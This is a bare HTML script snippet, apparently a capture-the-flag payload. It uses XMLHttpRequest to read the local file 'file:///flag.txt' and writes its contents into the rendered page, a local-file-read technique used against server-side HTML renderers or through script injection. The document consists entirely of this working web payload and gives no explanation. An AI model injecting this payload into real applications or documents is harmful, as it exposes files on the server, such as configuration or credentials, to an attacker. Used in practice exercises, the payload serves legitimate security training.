```
<script>
    x=new XMLHttpRequest;
    x.onload=function(){
    document.write(this.responseText)};
    x.open("GET","file:///flag.txt");
    x.send();
</script>
```